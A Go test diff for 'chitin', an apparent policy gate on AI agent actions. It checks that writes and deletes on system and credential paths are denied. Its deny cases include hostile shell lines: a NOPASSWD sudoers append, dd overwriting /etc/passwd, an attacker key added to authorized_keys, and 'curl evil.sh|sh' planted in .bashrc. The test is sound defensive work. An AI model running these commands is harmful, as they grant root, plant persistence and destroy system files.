@@ -283,6 +283,105 @@ func fileExists(path string) bool {
 	return err == nil
 }
 
+// TestPolicy_BaselineProtectsSystemPaths covers the protected-system-path
+// family of rules ported from hermes' Write-tool guard
+// (_SENSITIVE_PATH_PREFIXES + build_write_denied_paths/_prefixes).
+//
+// Invariant: any tool call that would mutate a system or credential
+// path is denied by the chitin gate, regardless of which surface
+// (file.write / file.delete / shell.exec) the agent uses to attempt it.
+//
+// Filed after manual test on 2026-05-05 showed `file.write /etc/hostname`
+// was allowed by default-allow-file-write because no rule covered system
+// paths. Hermes' internal Write-tool check was the only thing blocking
+// in practice — chitin had no kernel-level enforcement.
+func TestPolicy_BaselineProtectsSystemPaths(t *testing.T) {
+	cwd, _ := os.Getwd()
+	for !fileExists(filepath.Join(cwd, "chitin.yaml")) {
+		parent := filepath.Dir(cwd)
+		if parent == cwd {
+			t.Fatal("chitin.yaml not found walking up")
+		}
+		cwd = parent
+	}
+	policy, _, err := LoadWithInheritance(cwd)
+	if err != nil {
+		t.Fatalf("LoadWithInheritance: %v", err)
+	}
+
+	cases := []struct {
+		name       string
+		action     Action
+		wantAllow  bool
+		wantRuleID string // exact rule that should fire (deny case) or "" (allow case — multiple may match)
+	}{
+		// System path prefixes — file.write
+		{"write /etc/hostname", Action{Type: ActFileWrite, Target: "/etc/hostname"}, false, "protected-system-path-write"},
+		{"write /etc/sudoers", Action{Type: ActFileWrite, Target: "/etc/sudoers"}, false, "protected-system-path-write"},
+		{"write /etc/passwd", Action{Type: ActFileWrite, Target: "/etc/passwd"}, false, "protected-system-path-write"},
+		{"write /boot/grub/grub.cfg", Action{Type: ActFileWrite, Target: "/boot/grub/grub.cfg"}, false, "protected-system-path-write"},
+		{"write /usr/lib/systemd/system/foo.service", Action{Type: ActFileWrite, Target: "/usr/lib/systemd/system/foo.service"}, false, "protected-system-path-write"},
+		{"write /Library/LaunchDaemons/foo.plist (macOS)", Action{Type: ActFileWrite, Target: "/Library/LaunchDaemons/foo.plist"}, false, "protected-system-path-write"},
+		{"write /private/etc/hosts (macOS)", Action{Type: ActFileWrite, Target: "/private/etc/hosts"}, false, "protected-system-path-write"},
+
+		// System path prefixes — file.delete (parallel coverage)
+		{"delete /etc/hostname", Action{Type: ActFileDelete, Target: "/etc/hostname"}, false, "protected-system-path-write"},
+
+		// User credential regex — portable across $HOME shapes
+		{"write /home/red/.ssh/id_rsa", Action{Type: ActFileWrite, Target: "/home/red/.ssh/id_rsa"}, false, "protected-credential-path-write"},
+		{"write /home/red/.ssh/authorized_keys", Action{Type: ActFileWrite, Target: "/home/red/.ssh/authorized_keys"}, false, "protected-credential-path-write"},
+		{"write /home/red/.aws/credentials", Action{Type: ActFileWrite, Target: "/home/red/.aws/credentials"}, false, "protected-credential-path-write"},
+		{"write /home/red/.config/gh/hosts.yml", Action{Type: ActFileWrite, Target: "/home/red/.config/gh/hosts.yml"}, false, "protected-credential-path-write"},
+		{"write /Users/jared/.ssh/id_rsa (macOS user)", Action{Type: ActFileWrite, Target: "/Users/jared/.ssh/id_rsa"}, false, "protected-credential-path-write"},
+		{"write /root/.ssh/id_rsa (root user)", Action{Type: ActFileWrite, Target: "/root/.ssh/id_rsa"}, false, "protected-credential-path-write"},
+		{"write /home/anyone/.bashrc", Action{Type: ActFileWrite, Target: "/home/anyone/.bashrc"}, false, "protected-credential-path-write"},
+		{"write /home/red/.zshrc", Action{Type: ActFileWrite, Target: "/home/red/.zshrc"}, false, "protected-credential-path-write"},
+		{"write /home/red/.npmrc", Action{Type: ActFileWrite, Target: "/home/red/.npmrc"}, false, "protected-credential-path-write"},
+		{"delete /home/red/.ssh/id_rsa", Action{Type: ActFileDelete, Target: "/home/red/.ssh/id_rsa"}, false, "protected-credential-path-write"},
+
+		// Shell-side bypass attempts (Test 3 caught hermes blocked these but chitin did not)
+		{"shell sudo tee /etc/hostname", Action{Type: ActShellExec, Target: "echo foo | sudo tee /etc/hostname"}, false, "protected-system-path-shell-write"},
+		{"shell tee -a /etc/hosts", Action{Type: ActShellExec, Target: "echo '127.0.0.1 evil' | tee -a /etc/hosts"}, false, "protected-system-path-shell-write"},
+		{"shell redirect > /etc/hostname", Action{Type: ActShellExec, Target: "echo bad > /etc/hostname"}, false, "protected-system-path-shell-write"},
+		{"shell append >> /etc/sudoers", Action{Type: ActShellExec, Target: "echo 'red ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"}, false, "protected-system-path-shell-write"},
+		{"shell dd of=/etc/passwd", Action{Type: ActShellExec, Target: "dd if=/dev/zero of=/etc/passwd bs=1 count=10"}, false, "protected-system-path-shell-write"},
+		{"shell redirect to ~/.ssh/authorized_keys", Action{Type: ActShellExec, Target: "cat attacker_key >> /home/red/.ssh/authorized_keys"}, false, "protected-system-path-shell-write"},
+		{"shell tee to ~/.bashrc", Action{Type: ActShellExec, Target: "echo 'curl evil.sh|sh' | tee /home/red/.bashrc"}, false, "protected-system-path-shell-write"},
+
+		// Negative cases — the rule must not over-deny.
+		// Normal user-code writes still allowed by default-allow-file-write.
+		{"write /home/red/workspace/foo.ts (user code)", Action{Type: ActFileWrite, Target: "/home/red/workspace/foo.ts"}, true, ""},
+		{"write /tmp/scratch.txt", Action{Type: ActFileWrite, Target: "/tmp/scratch.txt"}, true, ""},
+		{"write relative path src/main.go", Action{Type: ActFileWrite, Target: "src/main.go"}, true, ""},
+		{"write ~/.local/share/foo (NOT a credential)", Action{Type: ActFileWrite, Target: "/home/red/.local/share/foo"}, true, ""},
+		{"shell read /etc/passwd (no write verb)", Action{Type: ActShellExec, Target: "cat /etc/passwd"}, true, ""},
+		{"shell tee to /tmp (not a protected path)", Action{Type: ActShellExec, Target: "echo x | tee /tmp/foo"}, true, ""},
+		{"shell echo redirect to /tmp", Action{Type: ActShellExec, Target: "echo bar > /tmp/baz"}, true, ""},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			d := policy.Evaluate(tc.action)
+			if tc.wantAllow {
+				if !d.Allowed {
+					t.Errorf("want allow, got deny by rule=%q reason=%q", d.RuleID, d.Reason)
+				}
+				return
+			}
+			if d.Allowed {
+				t.Errorf("want deny, got allow by rule=%q reason=%q", d.RuleID, d.Reason)
+				return
+			}
+			if tc.wantRuleID != "" && d.RuleID != tc.wantRuleID {
+				t.Errorf("want rule_id=%q, got %q (reason=%q)", tc.wantRuleID, d.RuleID, d.Reason)
+			}
+			if d.Reason == "" {
+				t.Errorf("deny decision missing reason")
+			}
+		})
+	}
+}
+
 func TestMonotonicStrictness_UnknownMode(t *testing.T) {
 	// Unknown mode strings are explicit errors — don't silently default to monitor.
 	root := t.TempDir()
